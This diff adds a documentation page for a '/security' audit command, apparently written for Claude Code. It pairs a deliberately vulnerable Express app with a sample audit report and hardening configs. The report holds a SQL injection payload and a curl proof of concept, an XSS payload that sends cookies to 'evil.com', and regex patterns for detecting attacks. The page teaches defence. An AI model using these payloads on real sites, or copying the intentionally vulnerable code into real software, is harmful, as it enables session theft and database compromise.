@@ -1,0 +1,945 @@
+---
+title: /security - Vulnerability Scan Command for Claude Code
+slug: security
+category: commands
+description: >-
+  Comprehensive security audit with vulnerability detection, threat analysis,
+  and automated remediation recommendations
+cardDescription: >-
+  Comprehensive security audit with vulnerability detection, threat analysis,
+  and automated remediation recommendations
+seoTitle: /security - Vulnerability Scan Command for Claude Code
+seoDescription: >-
+  Comprehensive security audit with vulnerability detection, threat analysis,
+  and automated remediation recommendations Discover tools for AI development.
+author: JSONbored
+authorProfileUrl: 'https://github.com/JSONbored'
+dateAdded: '2025-09-16'
+documentationUrl: 'https://docs.claude.ai/commands/security'
+installable: true
+installCommand: '/security [options] <file_or_project>'
+usageSnippet: '/security [options] <file_or_project>'
+copySnippet: '/security [options] <file_or_project>'
+tags:
+  - security
+  - audit
+  - vulnerability
+  - threat-analysis
+  - penetration-testing
+keywords:
+  - audit
+  - claude
+  - commands
+  - development
+  - penetration-testing
+  - security
+  - threat-analysis
+  - tools
+  - vulnerability
+readingTime: 14
+difficultyScore: 100
+hasTroubleshooting: true
+hasPrerequisites: false
+hasBreakingChanges: false
+robotsIndex: true
+robotsFollow: true
+commandSyntax: '/security [options] <file_or_project>'
+---
+The `/security` command provides comprehensive security auditing including vulnerability scanning, threat modeling, penetration testing, compliance checking, and automated security hardening recommendations.
+
+## Usage
+
+```
+/security [options] <file_or_project>
+```
+
+## Options
+
+### Audit Types
+- `--vulnerability` - OWASP Top 10 and CVE scanning
+- `--authentication` - Auth and session security analysis
+- `--authorization` - Access control and permissions audit
+- `--data-protection` - Encryption and data security review
+- `--infrastructure` - Server and network security assessment
+- `--compliance` - SOC2, GDPR, HIPAA compliance checking
+- `--all` - Comprehensive security audit (default)
+
+### Scan Depth
+- `--surface` - Quick surface-level scan
+- `--deep` - Comprehensive deep analysis
+- `--penetration` - Simulated attack testing
+- `--compliance` - Regulatory compliance audit
+
+### Threat Modeling
+- `--stride` - STRIDE threat modeling framework
+- `--attack-tree` - Generate attack tree analysis
+- `--risk-assessment` - Quantitative risk analysis
+- `--threat-intelligence` - Latest threat intelligence integration
+
+### Output Formats
+- `--format=report` - Detailed security report (default)
+- `--format=sarif` - SARIF format for CI/CD integration
+- `--format=json` - Machine-readable JSON output
+- `--format=executive` - Executive summary for stakeholders
+
+## Examples
+
+### Web Application Security Audit
+
+```javascript
+// Vulnerable web application with multiple security issues
+const express = require('express');
+const mysql = require('mysql');
+const bcrypt = require('bcrypt');
+const jwt = require('jsonwebtoken');
+const app = express();
+
+// 🚨 Security Issue 1: No rate limiting
+app.use(express.json());
+
+// 🚨 Security Issue 2: Hardcoded database credentials
+const db = mysql.createConnection({
+  host: 'localhost',
+  user: 'root',
+  password: 'password123', // 🚨 Hardcoded password
+  database: 'myapp'
+});
+
+// 🚨 Security Issue 3: Weak JWT secret
+const JWT_SECRET = 'secret'; // 🚨 Weak secret
+
+// 🚨 Security Issue 4: SQL Injection vulnerability
+app.post('/login', async (req, res) => {
+  const { email, password } = req.body;
+  
+  // 🚨 Direct string interpolation - SQL injection risk
+  const query = `SELECT * FROM users WHERE email = '${email}'`;
+  
+  db.query(query, async (err, results) => {
+    if (err) {
+      // 🚨 Security Issue 5: Information disclosure
+      return res.status(500).json({ error: err.message });
+    }
+    
+    if (results.length === 0) {
+      // 🚨 Security Issue 6: User enumeration
+      return res.status(401).json({ error: 'Invalid email' });
+    }
+    
+    const user = results[0];
+    
+    // 🚨 Security Issue 7: Timing attack vulnerability
+    if (await bcrypt.compare(password, user.password)) {
+      const token = jwt.sign(
+        { userId: user.id, email: user.email },
+        JWT_SECRET // 🚨 Weak secret
+      );
+      
+      // 🚨 Security Issue 8: Sensitive data in token
+      res.json({ token, user: user }); // 🚨 Exposes password hash
+    } else {
+      res.status(401).json({ error: 'Invalid password' });
+    }
+  });
+});
+
+// 🚨 Security Issue 9: Missing authentication middleware
+app.get('/admin/users', (req, res) => {
+  const query = 'SELECT * FROM users';
+  
+  db.query(query, (err, results) => {
+    if (err) {
+      return res.status(500).json({ error: err.message });
+    }
+    
+    // 🚨 Security Issue 10: No access control
+    res.json(results); // 🚨 Exposes all user data including passwords
+  });
+});
+
+// 🚨 Security Issue 11: XSS vulnerability
+app.get('/search', (req, res) => {
+  const { q } = req.query;
+  
+  // 🚨 Direct output without sanitization
+  res.send(`<h1>Search results for: ${q}</h1>`);
+});
+
+// 🚨 Security Issue 12: CSRF vulnerability (no CSRF protection)
+app.post('/transfer-money', (req, res) => {
+  const { to, amount } = req.body;
+  
+  // 🚨 No CSRF token validation
+  // Process money transfer...
+  
+  res.json({ success: true });
+});
+
+// 🚨 Security Issue 13: Missing security headers
+app.listen(3000, () => {
+  console.log('Server running on port 3000');
+});
+```
+
+**Security Audit Report:**
+
+```markdown
+# 🔒 Security Audit Report
+
+## 🚨 Critical Vulnerabilities (13 issues found)
+
+### 1. SQL Injection (CRITICAL - CWE-89)
+**Location:** `/login` endpoint, line 18  
+**CVSS Score:** 9.8 (Critical)  
+**Attack Vector:** Network  
+**Impact:** Complete database compromise
+
+**Vulnerability:**
+```javascript
+// ❌ Vulnerable code
+const query = `SELECT * FROM users WHERE email = '${email}'`;
+
+// 🚨 Attack payload:
+// email: "' OR '1'='1' UNION SELECT username, password FROM admin_users --"
+```
+
+**Proof of Concept:**
+```bash
+curl -X POST http://localhost:3000/login \
+  -H "Content-Type: application/json" \
+  -d '{"email": "\047 OR 1=1 --", "password": "anything"}'
+
+# Result: Bypasses authentication and may expose user data
+```
+
+**Impact:**
+- Complete database access
+- User credential theft
+- Data manipulation/deletion
+- Administrative access escalation
+
+**Remediation:**
+```javascript
+// ✅ Secure implementation with parameterized queries
+app.post('/login', async (req, res) => {
+  const { email, password } = req.body;
+  
+  // Input validation
+  if (!email || !password) {
+    return res.status(400).json({ error: 'Email and password required' });
+  }
+  
+  // Email format validation
+  const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+  if (!emailRegex.test(email)) {
+    return res.status(400).json({ error: 'Invalid email format' });
+  }
+  
+  try {
+    // ✅ Parameterized query prevents SQL injection
+    const query = 'SELECT id, email, password, role FROM users WHERE email = ? AND active = 1';
+    const results = await db.promise().query(query, [email]);
+    
+    if (results[0].length === 0) {
+      // ✅ Generic error message prevents user enumeration
+      return res.status(401).json({ error: 'Invalid credentials' });
+    }
+    
+    const user = results[0][0];
+    
+    // ✅ Secure password comparison
+    const isValidPassword = await bcrypt.compare(password, user.password);
+    
+    if (!isValidPassword) {
+      // ✅ Same error message for failed password
+      return res.status(401).json({ error: 'Invalid credentials' });
+    }
+    
+    // ✅ Secure token generation
+    const token = jwt.sign(
+      { 
+        userId: user.id, 
+        email: user.email,
+        role: user.role 
+      },
+      process.env.JWT_SECRET, // ✅ Strong secret from environment
+      { 
+        expiresIn: '1h',
+        issuer: 'myapp',
+        audience: 'myapp-users'
+      }
+    );
+    
+    // ✅ Don't expose sensitive data
+    res.json({ 
+      token,
+      user: {
+        id: user.id,
+        email: user.email,
+        role: user.role
+      }
+    });
+    
+    // ✅ Log successful login for monitoring
+    console.log(`User ${user.email} logged in successfully`);
+    
+  } catch (error) {
+    console.error('Login error:', error);
+    // ✅ Generic error message
+    res.status(500).json({ error: 'Internal server error' });
+  }
+});
+```
+
+### 2. Hardcoded Credentials (HIGH - CWE-798)
+**Location:** Database connection, line 9  
+**CVSS Score:** 8.5 (High)  
+**Impact:** Database access, credential exposure in source code
+
+**Vulnerability:**
+```javascript
+// ❌ Hardcoded credentials in source code
+const db = mysql.createConnection({
+  host: 'localhost',
+  user: 'root',
+  password: 'password123', // 🚨 Exposed in version control
+  database: 'myapp'
+});
+```
+
+**Remediation:**
+```javascript
+// ✅ Environment-based configuration
+require('dotenv').config();
+
+const db = mysql.createConnection({
+  host: process.env.DB_HOST || 'localhost',
+  user: process.env.DB_USER,
+  password: process.env.DB_PASSWORD,
+  database: process.env.DB_NAME,
+  ssl: process.env.NODE_ENV === 'production' ? {
+    rejectUnauthorized: true,
+    ca: fs.readFileSync(process.env.DB_SSL_CA),
+    cert: fs.readFileSync(process.env.DB_SSL_CERT),
+    key: fs.readFileSync(process.env.DB_SSL_KEY)
+  } : false,
+  acquireTimeout: 60000,
+  timeout: 60000,
+  reconnect: true
+});
+
+// ✅ Environment file (.env) - not committed to version control
+/*
+DB_HOST=secure-db.company.com
+DB_USER=app_user
+DB_PASSWORD=x$9mK#p2L@8nQ5vR
+DB_NAME=production_db
+DB_SSL_CA=/path/to/ca-cert.pem
+DB_SSL_CERT=/path/to/client-cert.pem
+DB_SSL_KEY=/path/to/client-key.pem
+JWT_SECRET=aB3dF6hJ9kL2nP5sT8wZ1cE4gI7mQ0uX
+*/
+```
+
+### 3. Cross-Site Scripting (XSS) (HIGH - CWE-79)
+**Location:** `/search` endpoint, line 44  
+**CVSS Score:** 8.2 (High)  
+**Impact:** Session hijacking, credential theft, malware distribution
+
+**Vulnerability:**
+```javascript
+// ❌ Direct output without sanitization
+app.get('/search', (req, res) => {
+  const { q } = req.query;
+  res.send(`<h1>Search results for: ${q}</h1>`);
+});
+
+// 🚨 Attack payload:
+// GET /search?q=<script>document.location='http://evil.com/steal?cookie='+document.cookie</script>
+```
+
+**Proof of Concept:**
+```bash
+# XSS payload that steals cookies
+curl "http://localhost:3000/search?q=%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E"
+
+# Result: JavaScript execution in victim's browser
+```
+
+**Remediation:**
+```javascript
+const DOMPurify = require('dompurify');
+const { JSDOM } = require('jsdom');
+
+const window = new JSDOM('').window;
+const purify = DOMPurify(window);
+
+app.get('/search', (req, res) => {
+  const { q } = req.query;
+  
+  // ✅ Input validation
+  if (!q || typeof q !== 'string') {
+    return res.status(400).json({ error: 'Invalid search query' });
+  }
+  
+  // ✅ Sanitize user input
+  const sanitizedQuery = purify.sanitize(q);
+  
+  // ✅ Use template engine with auto-escaping
+  res.render('search-results', {
+    query: sanitizedQuery,
+    results: performSearch(sanitizedQuery)
+  });
+});
+
+// ✅ Alternative: JSON API response (safer)
+app.get('/api/search', (req, res) => {
+  const { q } = req.query;
+  
+  if (!q || typeof q !== 'string' || q.length > 100) {
+    return res.status(400).json({ error: 'Invalid search query' });
+  }
+  
+  const results = performSearch(q); // Search function handles sanitization
+  
+  res.json({
+    query: q,
+    results: results,
+    total: results.length
+  });
+});
+```
+
+### 4. Missing Authentication & Authorization (HIGH - CWE-862)
+**Location:** `/admin/users` endpoint, line 37  
+**CVSS Score:** 8.0 (High)  
+**Impact:** Unauthorized data access, privilege escalation
+
+**Remediation:**
+```javascript
+const rateLimit = require('express-rate-limit');
+const helmet = require('helmet');
+
+// ✅ Security middleware
+app.use(helmet({
+  contentSecurityPolicy: {
+    directives: {
+      defaultSrc: ["'self'"],
+      styleSrc: ["'self'", "'unsafe-inline'"],
+      scriptSrc: ["'self'"],
+      imgSrc: ["'self'", "data:", "https:"],
+    },
+  },
+  hsts: {
+    maxAge: 31536000,
+    includeSubDomains: true,
+    preload: true
+  }
+}));
+
+// ✅ Rate limiting
+const authLimiter = rateLimit({
+  windowMs: 15 * 60 * 1000, // 15 minutes
+  max: 5, // 5 attempts per window
+  message: 'Too many login attempts, please try again later',
+  standardHeaders: true,
+  legacyHeaders: false,
+});
+
+const apiLimiter = rateLimit({
+  windowMs: 15 * 60 * 1000,
+  max: 100, // 100 requests per window
+  message: 'Too many requests, please try again later'
+});
+
+app.use('/login', authLimiter);
+app.use('/api/', apiLimiter);
+
+// ✅ Authentication middleware
+const authenticateToken = (req, res, next) => {
+  const authHeader = req.headers['authorization'];
+  const token = authHeader && authHeader.split(' ')[1];
+  
+  if (!token) {
+    return res.status(401).json({ error: 'Access token required' });
+  }
+  
+  jwt.verify(token, process.env.JWT_SECRET, (err, user) => {
+    if (err) {
+      return res.status(403).json({ error: 'Invalid or expired token' });
+    }
+    
+    req.user = user;
+    next();
+  });
+};
+
+// ✅ Authorization middleware
+const requireRole = (roles) => {
+  return (req, res, next) => {
+    if (!req.user) {
+      return res.status(401).json({ error: 'Authentication required' });
+    }
+    
+    if (!roles.includes(req.user.role)) {
+      return res.status(403).json({ error: 'Insufficient permissions' });
+    }
+    
+    next();
+  };
+};
+
+// ✅ Secure admin endpoint
+app.get('/admin/users', 
+  authenticateToken, 
+  requireRole(['admin', 'moderator']), 
+  async (req, res) => {
+    try {
+      // ✅ Parameterized query with limited fields
+      const query = `
+        SELECT id, email, role, created_at, last_login, active 
+        FROM users 
+        ORDER BY created_at DESC 
+        LIMIT ? OFFSET ?
+      `;
+      
+      const page = parseInt(req.query.page) || 1;
+      const limit = Math.min(parseInt(req.query.limit) || 20, 100);
+      const offset = (page - 1) * limit;
+      
+      const [users, totalCount] = await Promise.all([
+        db.promise().query(query, [limit, offset]),
+        db.promise().query('SELECT COUNT(*) as total FROM users')
+      ]);
+      
+      // ✅ Audit log
+      console.log(`Admin ${req.user.email} accessed user list`);
+      
+      res.json({
+        users: users[0],
+        pagination: {
+          page,
+          limit,
+          total: totalCount[0][0].total,
+          totalPages: Math.ceil(totalCount[0][0].total / limit)
+        }
+      });
+      
+    } catch (error) {
+      console.error('Admin users query error:', error);
+      res.status(500).json({ error: 'Internal server error' });
+    }
+  }
+);
+```
+
+### 5. Cross-Site Request Forgery (CSRF) (MEDIUM - CWE-352)
+**Location:** `/transfer-money` endpoint, line 50  
+**CVSS Score:** 6.8 (Medium)  
+**Impact:** Unauthorized actions on behalf of authenticated users
+
+**Remediation:**
+```javascript
+const csrf = require('csurf');
+const cookieParser = require('cookie-parser');
+
+app.use(cookieParser());
+
+// ✅ CSRF protection
+const csrfProtection = csrf({ 
+  cookie: {
+    httpOnly: true,
+    secure: process.env.NODE_ENV === 'production',
+    sameSite: 'strict'
+  }
+});
+
+app.use(csrfProtection);
+
+// ✅ Provide CSRF token to frontend
+app.get('/api/csrf-token', (req, res) => {
+  res.json({ csrfToken: req.csrfToken() });
+});
+
+// ✅ Protected financial endpoint
+app.post('/transfer-money', 
+  authenticateToken,
+  requireRole(['user', 'premium']),
+  async (req, res) => {
+    const { to, amount, description } = req.body;
+    
+    try {
+      // ✅ Input validation
+      if (!to || !amount || amount <= 0) {
+        return res.status(400).json({ error: 'Invalid transfer parameters' });
+      }
+      
+      if (amount > 10000) {
+        return res.status(400).json({ error: 'Transfer limit exceeded' });
+      }
+      
+      // ✅ Additional verification for large amounts
+      if (amount > 1000) {
+        const twoFACode = req.body.twoFactorCode;
+        if (!twoFACode || !verifyTwoFactorCode(req.user.id, twoFACode)) {
+          return res.status(403).json({ error: 'Two-factor authentication required' });
+        }
+      }
+      
+      // ✅ Database transaction for atomicity
+      await db.promise().beginTransaction();
+      
+      const transferResult = await processMoneyTransfer({
+        from: req.user.id,
+        to,
+        amount,
+        description
+      });
+      
+      await db.promise().commit();
+      
+      // ✅ Audit log
+      console.log(`Transfer: ${req.user.email} sent $${amount} to ${to}`);
+      
+      res.json({ 
+        success: true, 
+        transactionId: transferResult.id,
+        message: 'Transfer completed successfully'
+      });
+      
+    } catch (error) {
+      await db.promise().rollback();
+      console.error('Transfer error:', error);
+      res.status(500).json({ error: 'Transfer failed' });
+    }
+  }
+);
+```
+
+## 🛡️ Security Hardening Recommendations
+
+### 1. Infrastructure Security
+
+```yaml
+# ✅ Docker security configuration
+# Dockerfile
+FROM node:18-alpine AS base
+
+# Create non-root user
+RUN addgroup -g 1001 -S nodejs
+RUN adduser -S nodeuser -u 1001
+
+# Set working directory
+WORKDIR /app
+
+# Copy package files
+COPY package*.json ./
+
+# Install dependencies
+RUN npm ci --only=production && npm cache clean --force
+
+# Copy application code
+COPY . .
+
+# Change ownership to non-root user
+RUN chown -R nodeuser:nodejs /app
+
+# Switch to non-root user
+USER nodeuser
+
+# Expose port
+EXPOSE 3000
+
+# Health check
+HEALTHCHECK --interval=30s --timeout=3s --start-period=5s --retries=3 \
+  CMD curl -f http://localhost:3000/health || exit 1
+
+CMD ["node", "server.js"]
+```
+
+```yaml
+# ✅ Kubernetes security configuration
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: secure-app
+spec:
+  template:
+    spec:
+      serviceAccountName: app-service-account
+      securityContext:
+        runAsNonRoot: true
+        runAsUser: 1001
+        runAsGroup: 1001
+        fsGroup: 1001
+      containers:
+      - name: app
+        image: myapp:latest
+        securityContext:
+          allowPrivilegeEscalation: false
+          readOnlyRootFilesystem: true
+          capabilities:
+            drop:
+            - ALL
+        resources:
+          limits:
+            memory: "512Mi"
+            cpu: "500m"
+          requests:
+            memory: "256Mi"
+            cpu: "250m"
+        env:
+        - name: DB_PASSWORD
+          valueFrom:
+            secretKeyRef:
+              name: db-secret
+              key: password
+        volumeMounts:
+        - name: tmp
+          mountPath: /tmp
+        - name: cache
+          mountPath: /app/cache
+      volumes:
+      - name: tmp
+        emptyDir: {}
+      - name: cache
+        emptyDir: {}
+```
+
+### 2. Network Security
+
+```nginx
+# ✅ Nginx security configuration
+server {
+    listen 443 ssl http2;
+    server_name example.com;
+    
+    # SSL/TLS configuration
+    ssl_certificate /path/to/cert.pem;
+    ssl_certificate_key /path/to/key.pem;
+    ssl_protocols TLSv1.2 TLSv1.3;
+    ssl_ciphers ECDHE-RSA-AES256-GCM-SHA512:DHE-RSA-AES256-GCM-SHA512;
+    ssl_prefer_server_ciphers off;
+    ssl_session_cache shared:SSL:10m;
+    ssl_session_timeout 10m;
+    
+    # Security headers
+    add_header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload" always;
+    add_header X-Content-Type-Options "nosniff" always;
+    add_header X-Frame-Options "DENY" always;
+    add_header X-XSS-Protection "1; mode=block" always;
+    add_header Referrer-Policy "strict-origin-when-cross-origin" always;
+    add_header Content-Security-Policy "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; font-src 'self'; connect-src 'self'; frame-ancestors 'none';" always;
+    
+    # Rate limiting
+    limit_req_zone $binary_remote_addr zone=login:10m rate=5r/m;
+    limit_req_zone $binary_remote_addr zone=api:10m rate=10r/s;
+    
+    location /login {
+        limit_req zone=login burst=5 nodelay;
+        proxy_pass http://backend;
+    }
+    
+    location /api/ {
+        limit_req zone=api burst=20 nodelay;
+        proxy_pass http://backend;
+    }
+    
+    # Hide server information
+    server_tokens off;
+    
+    # Prevent access to sensitive files
+    location ~ /\. {
+        deny all;
+    }
+    
+    location ~ \.(env|config|sql|log)$ {
+        deny all;
+    }
+}
+```
+
+### 3. Database Security
+
+```sql
+-- ✅ Database security hardening
+
+-- Create application-specific user with limited privileges
+CREATE USER 'app_user'@'%' IDENTIFIED BY 'strong_random_password';
+
+-- Grant only necessary permissions
+GRANT SELECT, INSERT, UPDATE, DELETE ON myapp.users TO 'app_user'@'%';
+GRANT SELECT, INSERT, UPDATE, DELETE ON myapp.products TO 'app_user'@'%';
+GRANT SELECT, INSERT, UPDATE, DELETE ON myapp.orders TO 'app_user'@'%';
+
+-- Remove dangerous permissions
+REVOKE FILE ON *.* FROM 'app_user'@'%';
+REVOKE PROCESS ON *.* FROM 'app_user'@'%';
+REVOKE SUPER ON *.* FROM 'app_user'@'%';
+
+-- Enable SSL/TLS
+ALTER USER 'app_user'@'%' REQUIRE SSL;
+
+-- Set connection limits
+ALTER USER 'app_user'@'%' WITH MAX_CONNECTIONS_PER_HOUR 1000;
+ALTER USER 'app_user'@'%' WITH MAX_QUERIES_PER_HOUR 10000;
+
+-- Enable query logging for monitoring
+SET GLOBAL general_log = 'ON';
+SET GLOBAL slow_query_log = 'ON';
+SET GLOBAL long_query_time = 2;
+
+-- Create indexes for performance and prevent enumeration attacks
+CREATE INDEX idx_users_email ON users(email);
+CREATE INDEX idx_users_active ON users(active);
+CREATE INDEX idx_sessions_token ON sessions(token_hash);
+```
+
+### 4. Application Security Monitoring
+
+```javascript
+// ✅ Security monitoring and alerting
+const winston = require('winston');
+const rateLimit = require('express-rate-limit');
+
+// Security event logger
+const securityLogger = winston.createLogger({
+  level: 'info',
+  format: winston.format.combine(
+    winston.format.timestamp(),
+    winston.format.json()
+  ),
+  transports: [
+    new winston.transports.File({ filename: 'security.log' }),
+    new winston.transports.Console()
+  ]
+});
+
+// Security monitoring middleware
+const securityMonitor = (req, res, next) => {
+  // Log suspicious patterns
+  const suspiciousPatterns = [
+    /script[^>]*>.*<\/script>/i,
+    /javascript:/i,
+    /on\w+=/i,
+    /'\s*(or|and)\s*'?\d/i,
+    /union\s+select/i,
+    /\/\*.*\*\//,
+    /<iframe/i
+  ];
+  
+  const userInput = JSON.stringify({
+    body: req.body,
+    query: req.query,
+    params: req.params
+  });
+  
+  for (const pattern of suspiciousPatterns) {
+    if (pattern.test(userInput)) {
+      securityLogger.warn('Suspicious input detected', {
+        ip: req.ip,
+        userAgent: req.get('User-Agent'),
+        url: req.originalUrl,
+        method: req.method,
+        input: userInput,
+        pattern: pattern.toString()
+      });
+      
+      // Block obvious attack attempts
+      if (pattern.test(userInput) && req.originalUrl.includes('admin')) {
+        return res.status(403).json({ error: 'Request blocked' });
+      }
+    }
+  }
+  
+  next();
+};
+
+app.use(securityMonitor);
+
+// Failed login attempt monitoring
+const loginAttempts = new Map();
+
+app.post('/login', (req, res, next) => {
+  const clientId = req.ip + ':' + req.get('User-Agent');
+  const attempts = loginAttempts.get(clientId) || 0;
+  
+  if (attempts > 10) {
+    securityLogger.error('Potential brute force attack', {
+      ip: req.ip,
+      userAgent: req.get('User-Agent'),
+      attempts: attempts
+    });
+    
+    return res.status(429).json({ error: 'Too many failed attempts' });
+  }
+  
+  // Track failed attempts
+  res.on('finish', () => {
+    if (res.statusCode === 401) {
+      loginAttempts.set(clientId, attempts + 1);
+      setTimeout(() => loginAttempts.delete(clientId), 15 * 60 * 1000);
+    } else if (res.statusCode === 200) {
+      loginAttempts.delete(clientId);
+    }
+  });
+  
+  next();
+});
+
+// Security headers monitoring
+app.use((req, res, next) => {
+  res.on('finish', () => {
+    const securityHeaders = [
+      'X-Content-Type-Options',
+      'X-Frame-Options',
+      'X-XSS-Protection',
+      'Strict-Transport-Security',
+      'Content-Security-Policy'
+    ];
+    
+    const missingHeaders = securityHeaders.filter(header => !res.get(header));
+    
+    if (missingHeaders.length > 0) {
+      securityLogger.warn('Missing security headers', {
+        url: req.originalUrl,
+        missingHeaders: missingHeaders
+      });
+    }
+  });
+  
+  next();
+});
+```
+
+## 🎯 Security Compliance Checklist
+
+### ✅ OWASP Top 10 (2021)
+- [ ] A01: Broken Access Control
+- [ ] A02: Cryptographic Failures
+- [ ] A03: Injection
+- [ ] A04: Insecure Design
+- [ ] A05: Security Misconfiguration
+- [ ] A06: Vulnerable and Outdated Components
+- [ ] A07: Identification and Authentication Failures
+- [ ] A08: Software and Data Integrity Failures
+- [ ] A09: Security Logging and Monitoring Failures
+- [ ] A10: Server-Side Request Forgery (SSRF)
+
+### ✅ Data Protection (GDPR/CCPA)
+- [ ] Data encryption at rest and in transit
+- [ ] Personal data inventory and classification
+- [ ] Data retention and deletion policies
+- [ ] User consent management
+- [ ] Data breach notification procedures
+- [ ] Privacy by design implementation
+
+### ✅ Infrastructure Security
+- [ ] Network segmentation and firewalls
+- [ ] Container security and image scanning
+- [ ] Secrets management and rotation
+- [ ] Monitoring and incident response
+- [ ] Backup and disaster recovery
+- [ ] Vulnerability management program
+
+This security audit provides comprehensive vulnerability assessment with actionable remediation steps and compliance guidance.
